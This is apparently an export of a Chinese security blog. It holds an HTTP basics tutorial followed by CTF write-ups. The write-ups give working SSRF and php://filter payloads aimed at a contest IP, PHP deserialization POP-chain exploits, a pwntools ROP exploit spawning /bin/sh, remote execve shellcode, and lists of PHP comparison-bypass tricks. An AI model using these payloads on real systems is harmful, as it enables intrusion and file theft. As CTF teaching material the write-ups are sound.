5.文件名部分：从域名后的最后一个“/”开始到“？”为止，是文件名部分，如果没有“?”,则是从域名后的最后一个“/”开始到“#”为止，是文件部分，如果没有“？”和“#”，那么从域名后的最后一个“/”开始到结束，都是文件名部分。本例中的文件名是“index.asp”。文件名部分也不是一个URL必须的部分，如果省略该部分，则使用默认的文件名 6.锚部分：从“#”开始到最后，都是锚部分。本例中的锚部分是“name”。锚部分也不是一个URL必须的部分 7.参数部分：从“？”开始到“#”为止之间的部分为参数部分，又称搜索部分、查询部分。本例中的参数部分为“boardID=5&amp;ID=24618&amp;page=1”。参数可以允许有多个参数，参数与参数之间用“&amp;”作为分隔符。 （原文：http://blog.csdn.net/ergouge/article/details/8185219 ） URI和URL的区别URI，是uniform resource identifier，统一资源标识符，用来唯一的标识一个资源。Web上可用的每种资源如HTML文档、图像、视频片段、程序等都是一个来URI来定位的URI一般由三部组成：①访问资源的命名机制②存放资源的主机名③资源自身的名称，由路径表示，着重强调于资源。 URL是uniform resource locator，统一资源定位器，它是一种具体的URI，即URL可以用来标识一个资源，而且还指明了如何locate这个资源。URL是Internet上用来描述信息资源的字符串，主要用在各种WWW客户程序和服务器程序上，特别是著名的Mosaic。采用URL可以用一种统一的格式来描述各种信息资源，包括文件、服务器的地址和目录等。URL一般由三部组成：①协议(或称为服务方式)②存有该资源的主机IP地址(有时也包括端口号)③主机资源的具体地址。如目录和文件名等 URN，uniform resource name，统一资源命名，是通过名字来标识资源，比如mailto:java-net@java.sun.com。URI是以一种抽象的，高层次概念定义统一资源标识，而URL和URN则是具体的资源标识的方式。URL和URN都是一种URI。笼统地说，每个 URL 都是 URI，但不一定每个 URI 都是 URL。这是因为 URI 还包括一个子类，即统一资源名称 (URN)，它命名资源但不指定如何定位资源。上面的 mailto、news 和 isbn URI 都是 URN 的示例。 在Java的URI中，一个URI实例可以代表绝对的，也可以是相对的，只要它符合URI的语法规则。而URL类则不仅符合语义，还包含了定位该资源的信息，因此它不能是相对的。在Java类库中，URI类不包含任何访问资源的方法，它唯一的作用就是解析。相反的是，URL类可以打开一个到达资源的流。 HTTP之请求消息Request客户端发送一个HTTP请求到服务器的请求消息包括以下格式： 请求行（request line）、请求头部（header）、空行和请求数据四个部分组成。 请求行以一个方法符号开头，以空格分开，后面跟着请求的URI和协议的版本。 Get请求例子，使用Charles抓取的request： GET /562f25980001b1b106000338.jpg HTTP/1.1 Host img.mukewang.com User-Agent Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 Accept image/webp,image/*,*/*;q=0.8 Referer http://www.imooc.com/ Accept-Encoding gzip, deflate, sdch Accept-Language zh-CN,zh;q=0.8 第一部分：请求行，用来说明请求类型,要访问的资源以及所使用的HTTP版本.GET说明请求类型为GET,[/562f25980001b1b106000338.jpg]为要访问的资源，该行的最后一部分说明使用的是HTTP1.1版本。 第二部分：请求头部，紧接着请求行（即第一行）之后的部分，用来说明服务器要使用的附加信息从第二行起为请求头部，HOST将指出请求的目的地.User-Agent,服务器端和客户端脚本都能访问它,它是浏览器类型检测逻辑的重要基础.该信息由你的浏览器来定义,并且在每个请求中自动发送等等 第三部分：空行，请求头部后面的空行是必须的即使第四部分的请求数据为空，也必须有空行。 第四部分：请求数据也叫主体，可以添加任意的其他数据。这个例子的请求数据为空。 POST请求例子，使用Charles抓取的request： POST / HTTP1.1 Host:www.wrox.com User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022) Content-Type:application/x-www-form-urlencoded Content-Length:40 Connection: Keep-Alive name=Professional%20Ajax&amp;publisher=Wiley 第一部分：请求行，第一行明了是post请求，以及http1.1版本。第二部分：请求头部，第二行至第六行。第三部分：空行，第七行的空行。第四部分：请求数据，第八行。 HTTP之响应消息Response一般情况下，服务器接收并处理客户端发过来的请求后会返回一个HTTP的响应消息。 HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。 例子 HTTP/1.1 200 OK Date: Fri, 22 May 2009 06:07:21 GMT Content-Type: text/html; charset=UTF-8 &lt;html&gt; &lt;head&gt;&lt;/head&gt; &lt;body&gt; &lt;!--body goes here--&gt; &lt;/body&gt; &lt;/html&gt; 第一部分：状态行，由HTTP协议版本号， 状态码， 状态消息 三部分组成。第一行为状态行，（HTTP/1.1）表明HTTP版本为1.1版本，状态码为200，状态消息为（ok） 第二部分：消息报头，用来说明客户端要使用的一些附加信息第二行和第三行为消息报头，Date:生成响应的日期和时间；Content-Type:指定了MIME类型的HTML(text/html),编码类型是UTF-8 第三部分：空行，消息报头后面的空行是必须的第四部分：响应正文，服务器返回给客户端的文本信息。空行后面的html部分为响应正文。 HTTP之状态码状态代码有三位数字组成，第一个数字定义了响应的类别，共分五种类别: 1xx：指示信息–表示请求已接收，继续处理 2xx：成功–表示请求已被成功接收、理解、接受 3xx：重定向–要完成请求必须进行更进一步的操作 4xx：客户端错误–请求有语法错误或请求无法实现 5xx：服务器端错误–服务器未能实现合法的请求常见状态码： 200 OK //客户端请求成功 400 Bad Request //客户端请求有语法错误，不能被服务器所理解 401 Unauthorized //请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用 403 Forbidden //服务器收到请求，但是拒绝提供服务 404 Not Found //请求资源不存在，eg：输入了错误的URL 500 Internal Server Error //服务器发生不可预期的错误 503 Server Unavailable //服务器当前不能处理客户端的请求，一段时间后可能恢复正常 更多状态码http://www.runoob.com/http/http-status-codes.html HTTP请求方法根据HTTP标准，HTTP请求可以使用多种请求方法。 HTTP1.0定义了三种请求方法： GET, POST 和 HEAD方法。 HTTP1.1新增了五种请求方法：OPTIONS, PUT, DELETE, TRACE 和 CONNECT 方法。 GET 请求指定的页面信息，并返回实体主体。 HEAD 类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头 POST 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。 PUT 从客户端向服务器传送的数据取代指定的文档的内容。 DELETE 请求服务器删除指定的页面。 CONNECT HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。 OPTIONS 允许客户端查看服务器的性能。 TRACE 回显服务器收到的请求，主要用于测试或诊断。 HTTP工作原理HTTP协议定义Web客户端如何从Web服务器请求Web页面，以及服务器如何把Web页面传送给客户端。HTTP协议采用了请求/响应模型。客户端向服务器发送一个请求报文，请求报文包含请求的方法、URL、协议版本、请求头部和请求数据。服务器以一个状态行作为响应，响应的内容包括协议的版本、成功或者错误代码、服务器信息、响应头部和响应数据。 以下是 HTTP 请求/响应的步骤： 1、客户端连接到Web服务器一个HTTP客户端，通常是浏览器，与Web服务器的HTTP端口（默认为80）建立一个TCP套接字连接。例如，http://www.oakcms.cn。 2、发送HTTP请求通过TCP套接字，客户端向Web服务器发送一个文本的请求报文，一个请求报文由请求行、请求头部、空行和请求数据4部分组成。 3、服务器接受请求并返回HTTP响应Web服务器解析请求，定位请求资源。服务器将资源复本写到TCP套接字，由客户端读取。一个响应由状态行、响应头部、空行和响应数据4部分组成。 4、释放连接TCP连接若connection 模式为close，则服务器主动关闭TCP连接，客户端被动关闭连接，释放TCP连接;若connection 模式为keepalive，则该连接会保持一段时间，在该时间内可以继续接收请求; 5、客户端浏览器解析HTML内容客户端浏览器首先解析状态行，查看表明请求是否成功的状态代码。然后解析每一个响应头，响应头告知以下为若干字节的HTML文档和文档的字符集。客户端浏览器读取响应数据HTML，根据HTML的语法对其进行格式化，并在浏览器窗口中显示。 例如：在浏览器地址栏键入URL，按下回车之后会经历以下流程： 1、浏览器向 DNS 服务器请求解析该 URL 中的域名所对应的 IP 地址; 2、解析出 IP 地址后，根据该 IP 地址和默认端口 80，和服务器建立TCP连接; 3、浏览器发出读取文件(URL 中域名后面部分对应的文件)的HTTP 请求，该请求报文作为 TCP 三次握手的第三个报文的数据发送给服务器; 4、服务器对浏览器请求作出响应，并把对应的 html 文本发送给浏览器; 5、释放 TCP连接; 6、浏览器将该 html 文本并显示内容 GET和POST请求的区别GET请求 GET /books/?sex=man&amp;name=Professional HTTP/1.1 Host: www.wrox.com User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6) Gecko/20050225 Firefox/1.0.1 Connection: Keep-Alive 注意最后一行是空行 POST请求 POST / HTTP/1.1 Host: www.wrox.com User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6) Gecko/20050225 Firefox/1.0.1 Content-Type: application/x-www-form-urlencoded Content-Length: 40 Connection: Keep-Alive name=Professional%20Ajax&amp;publisher=Wiley 1、GET提交，请求的数据会附在URL之后（就是把数据放置在HTTP协议头中），以?分割URL和传输数据，多个参数用&amp;连接；例 如：login.action?name=hyddd&amp;password=idontknow&amp;verify=%E4%BD%A0 %E5%A5%BD。如果数据是英文字母/数字，原样发送，如果是空格，转换为+，如果是中文/其他字符，则直接把字符串用BASE64加密，得出如： %E4%BD%A0%E5%A5%BD，其中％XX中的XX为该符号以16进制表示的ASCII。 POST提交：把提交的数据放置在是HTTP包的包体中。上文示例中红色字体标明的就是实际的传输数据 因此，GET提交的数据会在地址栏中显示出来，而POST提交，地址栏不会改变 2、传输数据的大小：首先声明：HTTP协议没有对传输的数据大小进行限制，HTTP协议规范也没有对URL长度进行限制。 而在实际开发中存在的限制主要有： GET:特定浏览器和服务器对URL长度有限制，例如 IE对URL长度的限制是2083字节(2K+35)。对于其他浏览器，如Netscape、FireFox等，理论上没有长度限制，其限制取决于操作系 统的支持。 因此对于GET提交时，传输数据就会受到URL长度的 限制。 POST:由于不是通过URL传值，理论上数据不受 限。但实际各个WEB服务器会规定对post提交数据大小进行限制，Apache、IIS6都有各自的配置。 3、安全性 POST的安全性要比GET的安全性高。比如：通过GET提交数据，用户名和密码将明文出现在URL上，因为(1)登录页面有可能被浏览器缓存；(2)其他人查看浏览器的历史纪录，那么别人就可以拿到你的账号和密码了，除此之外，使用GET提交数据还可能会造成Cross-site request forgery攻击 4、Http get,post,soap协议都是在http上运行的 （1）get：请求参数是作为一个key/value对的序列（查询字符串）附加到URL上的查询字符串的长度受到web浏览器和web服务器的限制（如IE最多支持2048个字符），不适合传输大型数据集同时，它很不安全 （2）post：请求参数是在http标题的一个不同部分（名为entity body）传输的，这一部分用来传输表单信息，因此必须将Content-type设置为:application/x-www-form- urlencoded。post设计用来支持web窗体上的用户字段，其参数也是作为key/value对传输。但是：它不支持复杂数据类型，因为post没有定义传输数据结构的语义和规则。 （3）soap：是http post的一个专用版本，遵循一种特殊的xml消息格式Content-type设置为: text/xml 任何数据都可以xml化。 Http协议定义了很多与服务器交互的方法，最基本的有4种，分别是GET,POST,PUT,DELETE. 一个URL地址用于描述一个网络上的资源，而HTTP中的GET, POST, PUT, DELETE就对应着对这个资源的查，改，增，删4个操作。 我们最常见的就是GET和POST了。GET一般用于获取/查询资源信息，而POST一般用于更新资源信息. 我们看看GET和POST的区别 GET提交的数据会放在URL之后，以?分割URL和传输数据，参数之间以&amp;相连，如EditPosts.aspx?name=test1&amp;id=123456. POST方法是把提交的数据放在HTTP包的Body中. GET提交的数据大小有限制（因为浏览器对URL的长度有限制），而POST方法提交的数据没有限制. GET方式需要使用Request.QueryString来取得变量的值，而POST方式通过Request.Form来获取变量的值。 GET方式提交数据，会带来安全问题，比如一个登录页面，通过GET方式提交数据时，用户名和密码将出现在URL上，如果页面可以被缓存或者其他人可以访问这台机器，就可以从历史记录获得该用户的账号和密码.]]></content>
      <tags>
        <tag>读书心得</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈ssrf绕过]]></title>
    <url>%2F2019%2F02%2F08%2F%E6%B5%85%E8%B0%88ssrf%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[以hgame2019-week2的web为例 php trick 描述some php tricks URL http://118.24.3.214:3001 基准分数 200 当前分数 200 题目源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php//admin.phphighlight_file(__FILE__);$str1 = (string)@$_GET['str1'];$str2 = (string)@$_GET['str2'];$str3 = @$_GET['str3'];$str4 = @$_GET['str4'];$str5 = @$_GET['H_game'];$url = @$_GET['url'];if( $str1 == $str2 )&#123; die('step 1 fail');&#125;if( md5($str1) != md5($str2) )&#123; die('step 2 fail');&#125;if( $str3 == $str4 )&#123; die('step 3 fail');&#125;if ( md5($str3) !== md5($str4))&#123; die('step 4 fail');&#125;if (strpos($_SERVER['QUERY_STRING'], "H_game") !==false) &#123; die('step 5 fail');&#125;if(is_numeric($str5))&#123; die('step 6 fail');&#125;if ($str5&lt;9999999999)&#123; die('step 7 fail');&#125;if ((string)$str5&gt;0)&#123; die('step 8 fial');&#125;if (parse_url($url, PHP_URL_HOST) !== "www.baidu.com")&#123; die('step 9 fail');&#125;if (parse_url($url,PHP_URL_SCHEME) !== "http")&#123; die('step 10 fail');&#125;$ch = curl_init();curl_setopt($ch,CURLOPT_URL,$url);$output = curl_exec($ch);curl_close($ch);if($output === FALSE)&#123; die('step 11 fail');&#125;else&#123; echo $output;&#125; 题目提示admin.php，访问一下 让人联想到ssrf 前面的几个if都是正常绕过 12345678910111213141516if (parse_url($url, PHP_URL_HOST) !== "www.baidu.com")&#123; die('step 9 fail'); &#125; if (parse_url($url,PHP_URL_SCHEME) !== "http")&#123; die('step 10 fail'); &#125; $ch = curl_init(); curl_setopt($ch,CURLOPT_URL,$url); $output = curl_exec($ch); curl_close($ch); if($output === FALSE)&#123; die('step 11 fail'); &#125; else&#123; echo $output; &#125; 这里涉及了parse_url函数的绕过，我们既要访问到本地的admin.php又要保证URL符合www.baidu.com 找到了这篇文章https://www.cnblogs.com/afanti/p/9928371.html 这里可用@进行绕过 http://@127.0.0.1:80@www.baidu.com/admin.php 可以使其访问到admin.php payload: http://118.24.3.214:3001/index.php?str1=s878926199a&amp;str2=s155964671a&amp;str3[]=1&amp;str4[]=2%00&amp;H+game[]=999&amp;url=http://@127.0.0.1:80@www.baidu.com/admin.php 得到了admin的源码 123456789101112131415&lt;?php//flag.phpif($_SERVER['REMOTE_ADDR'] != '127.0.0.1') &#123; die('only localhost can see it');&#125;$filename = $_GET['filename']??'';if (file_exists($filename)) &#123; echo "sorry,you can't see it";&#125;else&#123; echo file_get_contents($filename);&#125;highlight_file(__FILE__);?&gt; 这里源码的意思是这个文件不存在但是还是让我们读取，在这里可以使用php://filter伪协议 最后payload: http://118.24.3.214:3001/index.php?str1=s878926199a&amp;str2=s155964671a&amp;str3[]=1&amp;str4[]=2%00&amp;H+game[]=999&amp;url=http://@127.0.0.1:80@www.baidu.com/admin.php?filename=php://filter/read=convert.base64-encode/resource=flag.php 得到一串base64编码 PD9waHAgJGZsYWcgPSBoZ2FtZXtUaEVyNF9BcjRfczBtNF9QaHBfVHIxY2tzfSA/Pgo= 解密后得到flag]]></content>
      <tags>
        <tag>系统总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安恒杯1月赛wp]]></title>
    <url>%2F2019%2F01%2F31%2F%E5%AE%89%E6%81%92%E6%9D%AF1%E6%9C%88%E8%B5%9Bwp%2F</url>
    <content type="text"><![CDATA[webbabygo题目源码 &lt;?php @error_reporting(1); include &apos;flag.php&apos;; class baby { protected $skyobj; public $aaa; public $bbb; function __construct() { $this-&gt;skyobj = new sec; } function __toString() { if (isset($this-&gt;skyobj)) return $this-&gt;skyobj-&gt;read(); } } class cool { public $filename; public $nice; public $amzing; function read() { $this-&gt;nice = unserialize($this-&gt;amzing); $this-&gt;nice-&gt;aaa = $sth; if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb) { $file = &quot;./{$this-&gt;filename}&quot;; if (file_get_contents($file)) { return file_get_contents($file); } else { return &quot;you must be joking!&quot;; } } } } class sec { function read() { return &quot;it&apos;s so sec~~&quot;; } } if (isset($_GET[&apos;data&apos;])) { $Input_data = unserialize($_GET[&apos;data&apos;]); echo $Input_data; } else { highlight_file(&quot;./index.php&quot;); } ?&gt; 这个和前几天博客讨论的反序列化pop链构造是一样的，直接放上payload &lt;?php @error_reporting(1); include &apos;flag.php&apos;; class baby { protected $skyobj; public $aaa; public $bbb; function __construct() { $this-&gt;skyobj = new cool(); } function __toString() { if (isset($this-&gt;skyobj)) return $this-&gt;skyobj-&gt;read(); } } class cool { public $filename = &apos;flag.php&apos;; public $nice; public $amzing; function read() { $this-&gt;nice = unserialize($this-&gt;amzing); $this-&gt;nice-&gt;aaa = $sth; if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb) { $file = &quot;./{$this-&gt;filename}&quot;; if (file_get_contents($file)) { return file_get_contents($file); } else { return &quot;you must be joking!&quot;; } } } } class sec { function read() { return &quot;it&apos;s so sec~~&quot;; } } $a = new baby(); $a = serialize($a); $a = urlencode($a); echo $a; ?&gt; 得到下面这串字符串： O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BN%3B%7D 加入题目进行验证 成功获得flag MISCzhunianjixiang题目是一张图片 用foremost对文件提取，得到两张图片 扫描二维码 提示二维码有古怪 拖到stegsolve后发现flag]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RedHat 2017-pwn1题目复现]]></title>
    <url>%2F2019%2F01%2F30%2FRedHat-2017-pwn1%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[碰到了RedHat 2017 的一道pwn，算是一道很经典的ROP，这里记录一下。 程序只有一个输入点： 检查保护机制： Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 可以看见开启了NX 我们将程序拖进ida中查看： int __cdecl main() { int v1; // [esp+18h] [ebp-28h] puts(&quot;pwn test&quot;); fflush(stdout); __isoc99_scanf(&quot;%s&quot;, &amp;v1); printf(&quot;%s&quot;, &amp;v1); return 1; } 程序流程非常简单，可以看到在scanf函数处存在溢出问题，我们可以使其执行system指令，而在程序中可以找到内置的system指令，但是我们无法在程序中获取到/bin/sh字符串，这里再次利用rop技术，调用scanf函数将/bin/sh字符串读取到程序段中，然后再执行system函数 这里介绍一下神器pwntools的ROP模块的用法，例如： rop.call(&apos;read&apos;, (0, elf.bss(0x80))) 其中 (0, elf.bss(0x80)) 是read函数的参数，即使call的函数参数只有一个，我们也要使用一个元组(参数1，)这样 回到本程序，我们来判断需要填充的字节个数： 我们需要填写52个无用字符 下面编写exp: from pwn import * p = process(&apos;./pwn1&apos;) elf = ELF(&apos;./pwn1&apos;) rop = ROP(&apos;./pwn1&apos;) rop.call(0x08048410,(0x08048629, 0x0804A040)) rop.system(0x0804A040) payload = str(rop) p.sendline(52*&apos;a&apos;+payload) p.sendline(&apos;/bin/sh&apos;) p.interactive() 成功获得shell]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwn之shellcode编写]]></title>
    <url>%2F2019%2F01%2F29%2Fpwn%E4%B9%8Bshellcode%E7%BC%96%E5%86%99%2F</url>
    <content type="text"><![CDATA[这里以前几天碰到的hgame2019的一道pwn题目为例 程序直接就给了输入点，我们拖入到ida查看 这是一个64位程序，我们正常在main函数处f5反编译时出现了报错 我们选中报错那行代码按d，即可正常反编译 int __cdecl main(int argc, const char **argv, const char **envp) { char buf[92]; // [rsp+0h] [rbp-60h] int i; // [rsp+5Ch] [rbp-4h] signal(14, handle); alarm(0xAu); read(0, buf, 0x50uLL); for ( i = 0; i &lt;= 79; ++i ) buf[i] ^= i + 1; JUMPOUT(*(_QWORD *)&amp;byte_400672); } 改程序直接调用了我们输入的shellcode，但是注意在 for ( i = 0; i &lt;= 79; ++i ) buf[i] ^= i + 1; 这里他将我们输入的shellcode和i+1进行了异或，所以我们需要将我们的shellcode与i+1进行异或后再发送给程序 关于shellcode，我们不会编写的话可以去公共数据库寻找合适的shellcode http://shell-storm.org/shellcode/ 这里我使用了一位师傅分享的shellcode 我们先将其与i+1进行异或运算 buf = &quot;\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05&quot; m = &quot;&quot; for i in range(0,34): m = m+chr(ord(buf[i])^(i+1)) 而后将其整合在最后的exp中： from pwn import * context(os=&apos;linux&apos;, arch=&apos;amd64&apos;, log_level=&apos;debug&apos;) p = remote(&apos;118.24.3.214&apos;,10000) #p = process(&apos;./babysc&apos;) buf = &quot;\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05&quot; m = &quot;&quot; for i in range(0,34): m = m+chr(ord(buf[i])^(i+1)) p.send(m) p.interactive() 执行后成功获得了权限]]></content>
      <tags>
        <tag>pwn，CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF中常出现的PHP函数]]></title>
    <url>%2F2019%2F01%2F28%2FCTF%E4%B8%AD%E5%B8%B8%E5%87%BA%E7%8E%B0%E7%9A%84PHP%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[文章部分内容来源于网络 strcmpstrcmp(a1，a2)函数用来比较两个字符串是否相等的，比较的是对应字符的ascii码，如果相等返回0，当a1的ascii大于a2的返回小于0，a1的ascii码小于a2的，返回大于0. 但是这个函数是存在漏洞的，我们知道这个函数是用来比较字符串的，但是当我们传入为数组是，那变成字符串和数组进行比较了，因此php在5.2之前，默认返回的-1，5.2版本之后返回0.因此有时我们便可以利用这个漏洞 demo： &lt;?php error_reporting(); $flag=$_GET[&apos;flag&apos;]; if(strcmp(&apos;Waldo_cuit&apos;,$flag)){ echo &apos;NO!&apos;; } else{ echo &apos;YES!&apos;; } ?&gt; eregereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE 字符串对比解析，这里如果$_GET[‘password’]为数组，则返回值为NULL，如果为123 || asd || 12as || 123%00&amp;&amp;&amp;**，则返回值为true is_numericdemo: &lt;?php echo is_numeric(233333); # 1 echo is_numeric(&apos;233333&apos;);# 1 echo is_numeric(0x233333);# 1 echo is_numeric(&apos;0x233333&apos;); # 1 echo is_numeric(&apos;233333abc&apos;); # 0 ?&gt; Intval获取变量的整数值，允许以使用特定的进制返回。默认10进制 注:如果参数为整数，则不做任何处理。 我们可以构造字符串绕过： 当取回字符串整数的时候，如果字符串中含有非数字的字符，将会返回第一次出现非数字符的前面的整数。若果没有数字返回0 parse_str与 parse_str() 类似的函数还有 mb_parse_str()，parse_str 将字符串解析成多个变量，如果参数str是URL传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域。 //var.php?var=new $var=&apos;init&apos;; parse_str($_SERVER[&apos;QUERY_STRING&apos;]); print $var; MD5PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0 常见字符串： QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a sha1(str) sha1(&apos;aaroZmOk&apos;) sha1(&apos;aaK1STfY&apos;) sha1(&apos;aaO8zKZF&apos;) sha1(&apos;aa3OFF9m&apos;) 同时MD5不能处理数组，有以下判断可用数组绕过： if(@md5($_GET[&apos;a&apos;]) == @md5($_GET[&apos;b&apos;])) { echo &quot;yes&quot;; } preg_match如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束(^ 和 $)，则可以存在绕过的问题 &lt;?php $ip = &apos;1.1.1.1 abcd&apos;; // 可以绕过 if(!preg_match(&quot;/(\d+)\.(\d+)\.(\d+)\.(\d+)/&quot;,$ip)) { die(&apos;error&apos;); } else { echo(&apos;key...&apos;); } ?&gt;]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php反序列化pop链的构造]]></title>
    <url>%2F2019%2F01%2F27%2Fphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E7%9A%84%E6%9E%84%E9%80%A0%2F</url>
    <content type="text"><![CDATA[通常反序列化的攻击是在魔术方法中出现一些可利用的漏洞，通过自动调用来触发漏洞。 但是如果关键代码不在魔术方法中，而是在一个类的普通方法中。这个时候我们可以通过寻找相同的函数名将类的属性和敏感函数联系起来 借用网上的代码： &lt;?php class lemon { protected $ClassObj; function __construct() { $this-&gt;ClassObj = new normal(); } function __destruct() { $this-&gt;ClassObj-&gt;action(); } } class normal { function action() { echo &quot;hello&quot;; } } class evil { private $data; function action() { eval($this-&gt;data); } } unserialize($_GET[&apos;d&apos;]); 其中类normal 和 evil同时拥有action方法，并且evil中的方法是可控的，我们可以通过反序列化来掉用evil类中的action方法 exp: &lt;?php class lemon { protected $ClassObj; function __construct() { $this-&gt;ClassObj = new evil(); } function __destruct() { $this-&gt;ClassObj-&gt;action(); } } class normal { function action() { echo &quot;hello&quot;; } } class evil { private $data = &quot;phpinfo();&quot;; function action() { eval($this-&gt;data); } } $a = new lemon(); echo urlencode(serialize($a)); 会生成这样一段payload O%3A5%3A%22lemon%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00data%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D 用get方式传入 可以看到成功进行了利用]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HGAME 2019-week1 writeup]]></title>
    <url>%2F2019%2F01%2F26%2FHGAME-2019-week1-writeup%2F</url>
    <content type="text"><![CDATA[web谁吃了我的flag题目是考察备份文件的恢复，将.index.html.swp下载下来，然后使用命令vim -r index.html即可恢复文件查看到flag 换头大作战在响应头出多次按照提示变换，最后得到flag very easy web题目代码如下 &lt;?php error_reporting(0); include(&quot;flag.php&quot;); if(strpos(&quot;vidar&quot;,$_GET[&apos;id&apos;])!==FALSE) die(&quot;&lt;p&gt;干巴爹&lt;/p&gt;&quot;); $_GET[&apos;id&apos;] = urldecode($_GET[&apos;id&apos;]); if($_GET[&apos;id&apos;] === &quot;vidar&quot;) { echo $flag; } highlight_file(__FILE__); ?&gt; 可以看到在代码中间有这么一句 $_GET[&apos;id&apos;] = urldecode($_GET[&apos;id&apos;]); 将参数进行了URL解码，而我们知道除了这个解码外，浏览器额外还会进行解码，所以我们需要将参数进行两次URL编码，同时自然绕过strpos函数 加密网址：http://web.chacuo.net/charseturlencode can u find me?f12查看源码，发现了f12.php 访问后提示让我们post一个密码，随便post一个密码，可以在返回包中看到真实的密码 输入后再次抓包即可得到flag REHelloRe打开发现是ELF文件，使用strings命令查看字符串发现flag Pro的Python教室(一)代码如下 import base64 import hashlib enc1 = &apos;hgame{&apos; enc2 = &apos;SGVyZV8xc18zYXN5Xw==&apos; enc3 = &apos;Pyth0n}&apos; print &apos;Welcome to Processor\&apos;s Python Classroom!\n&apos; print &apos;Here is Problem One.&apos; print &apos;There\&apos;re three parts of the flag.&apos; print &apos;------------------------------------------------&apos; print &apos;Plz input the first part:&apos; first = raw_input() if first == enc1: pass else: print &apos;Sorry , You\&apos;re so vegatable!&apos; exit() print &apos;Plz input the secend part:&apos; secend = raw_input() secend = base64.b64encode(secend) if secend == enc2: pass else: print &apos;Sorry , You\&apos;re so vegatable!&apos; exit() print &apos;Plz input the third part:&apos; third = raw_input() third = base64.b32decode(third) if third == enc3: pass else: print &apos;Sorry , You\&apos;re so vegatable!&apos; exit() print &apos;Oh, You got it !&apos; 直接将SGVyZV8xc18zYXN5Xw==base64解码后拼接成flag就可以了 PWNaaaaaaaaaa使用IDA打开查看 int __cdecl main(int argc, const char **argv, const char **envp) { signed int v3; // eax signed int v5; // [rsp+Ch] [rbp-4h] setbuf(_bss_start, 0LL); signal(14, handle); alarm(0xAu); puts(&quot;Welcome to PWN&apos;world!let us aaaaaaaaaa!!!&quot;); v5 = 0; while ( 1 ) { v3 = v5++; if ( v3 &gt; 99 ) break; if ( getchar() != 97 ) exit(0); } system(&quot;/bin/sh&quot;); return 0; } 我们发送100个a就可以了 exp: from pwn import * #p = process(&apos;./a&apos;) p = remote(&apos;118.24.3.214&apos;,9999) p.sendlineafter(&apos;!!!&apos;,&apos;a&apos;*100) p.interactive() MISCBroken Chest打开发现压缩包是损坏的，修复一下文件头，然后用注释的字符串作为密码，得到flag Try在流量包中提取到一个压缩包，其中有一passWord文件，提示hgame**，想到掩码攻击，爆破得到密码解压 又得到一张图片，使用foremost分离出Word文件，打开得到flag CRYPTOMIX题目给了以下代码 --.../....-/....-/-.../--.../...--/...../..-./-..../-../-..../..-./--.../----./....-/....-/--.../.----/-..../-.../--.../-.../-..../..---/...../.----/-..../-..../...--/....-/...--/-----/-..../...../--.../-.. 感觉像是摩斯码，将/替换成空格，即可得到flag Base全家手动测试 import base64 import requests url = &quot;http://plir4axuz.bkt.clouddn.com/hgame2019/enc.txt&quot; html = requests.get(url) result = html.text result = base64.b64decode(result) result = base64.b64decode(result) result = base64.b16decode(result) result = base64.b16decode(result) result = base64.b16decode(result) result = base64.b32decode(result) result = 